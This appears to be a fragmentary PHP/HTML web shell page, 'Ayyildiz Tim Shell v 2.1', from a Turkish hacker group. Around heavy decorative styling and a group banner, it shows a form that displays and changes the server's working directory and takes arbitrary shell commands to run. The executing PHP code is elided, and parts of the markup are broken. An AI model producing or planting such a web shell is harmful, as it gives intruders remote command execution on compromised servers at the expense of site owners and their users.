...
<title>Ayyildiz Tim | AYT | Shell v 2.1 Biz B&uuml;y&uuml;k T&uuml;rk
	Milletinin Hizmetindeyiz...</title>
</head>
...
<meta name="Copyright" content=TouCh ByiJOo">
...
<body bgcolor="#000000" text="#C0C0C0" link="#FFD9FF" vlink="#FFD9FF"
	alink="#00FF00">
	<bgsound src="bayrak.mp3" loop="infinite">

	<center>
		<font color="red" size="10" face="Imprint MT Shadow"> </font>
		<TR>
			<TD vAlign=center align=left width=144><SCRIPT language=JavaScript1.2>if (document.all)document.body.style.cssText="border:25 ridge #404040"</SCRIPT>
			</TD>
		...
		<STYLE>
BODY {
	BORDER-RIGHT: #df827a 3px ridge;
	BORDER-TOP: #df827a 3px ridge;
	BORDER-LEFT: #df827a 3px ridge;
	SCROLLBAR-ARROW-COLOR: #ffffff;
	BORDER-BOTTOM: #df827a 3px ridge;
	SCROLLBAR-BASE-COLOR: #df827a
}
...
A:hover {
	BORDER-RIGHT: #df3f1f thin dotted;
	BORDER-TOP: #df3f1f thin dotted;
	FONT-SIZE: 9pt;
	BORDER-LEFT: #df3f1f thin dotted;
	COLOR: #df3f1f;
	BORDER-BOTTOM: #df3f1f thin dotted;
	FONT-FAMILY: Comic Sans MS
}
...
A {
	TEXT-DECORATION: none
		...
		<DIV align=center>
			<DIV id=welle
				style="FONT-SIZE: 34pt; FILTER: Wave(freq = 1, light = 50, phase = 50, strength = 1); WIDTH: 100%; COLOR: #ffffff">
				<FONT color=#ff0000><FONT color=#ffffff><FONT color=#ff0000><FONT
							color=#ffffff><FONT color=#ff0000> <FONT color=#ffffff> </font><FONT
									color=#ffffff></font><FONT color=#ffffff></font><FONT
									color=#ffffff></font><FONT color=#ffffff><FONT color=#ff0000>
...
<body>
	<div align="center">
		<table width="918" height="484" border="15">
			<tr>
				<td width="880"><h1 align="center" class="style1">
						<img
							src="http://www.ayyildiz.org/board/images/shine/misc/logo.jpg"
							width="880" height="200">
					</h1>
					<div align="center">
						<span class="style1"><?php echo PHPSHELL_VERSION ?></span>          <?php
    ...
    ?>
					...
					<form name="myform" action="<?php echo $PHP_SELF ?>" method="post">
						<p align="center">
							<strong>Bulundugunuz Dizin</strong>: <b>
            <?php
            ...
            ?>
						...
						<p align="center">
							<strong>Dizin Degistir</strong> : <select name="work_dir"
                ...
                ?>
						...
						<p align="center">
							<strong>Komut</strong>: <input type="text" name="command"
								size="60"> <input name="submit_btn" type="submit"
								value="Komut Calistir">
						</p>
						<p align="center">
							<strong>Surekli Bagli Kal</strong> <input type="checkbox"
								name="stderr">
						</p>
...
document.forms[0].command.focus();
					...
					<p align="center" class="style2">
						Copyright &copy; 2006&ndash;2007, Powered byThehacker. v 2.1 - <a
							href="http|//www.ayyildiz.org" class="style1">www.ayyildiz.org</a>
					</p>
					<p align="center" class="style2">Ayyildiz TIM | AYT | TUM HAKLARI
						SAKLIDIR.</p>
					<p align="center">
						<img src="http://ayyildiz.org/images/whosonline2.gif" width="60"
							height="45">
					</p></td>
			</tr>
		</table>
